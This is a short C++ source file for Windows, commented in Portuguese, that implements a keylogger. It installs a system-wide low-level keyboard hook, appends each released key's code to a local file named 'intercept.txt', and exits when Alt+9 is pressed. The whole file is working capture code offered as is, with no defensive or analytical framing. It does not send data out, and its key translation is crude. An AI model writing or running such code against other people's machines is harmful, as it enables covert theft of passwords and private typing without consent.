#define WIN32_WINNT 0x0500
#include <windows.h>
#include <fstream>
#pragma comment(lib, "user32.lib")
using namespace std;

//execução na primeira vez que o programa é executado
//quando o arquivo "intercept.txt" for aberto
ofstream out("intercept.txt", ios::app);


//especifica o processo de callback
//executando quando uma tecla é pressionada
LRESULT CALLBACK ProcessKB(int ncode, WPARAM event, LPARAM kb){
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)kb;
    //checa o evento de pressionar uma tecla
    if(event == WM_KEYUP) out << (char)p->vkCode;
    //escreve no arquivo o código da tecla pressionada e chama o próximo hook
    return CallNextHookEx(NULL, ncode, event, kb);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int nShowCmd){
    MSG msg;
    out << "Intercepted Keyboard:\n\n";
    HHOOK captest = SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);

    RegisterHotKey(NULL, 1, MOD_ALT, 0x39);
    while(GetMessage(&msg, NULL, 0, 0)!=0){
        if(msg.message == WM_HOTKEY){
            out << "\n\nEnd Intercept\n\n";
            out.close();
            return 0;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}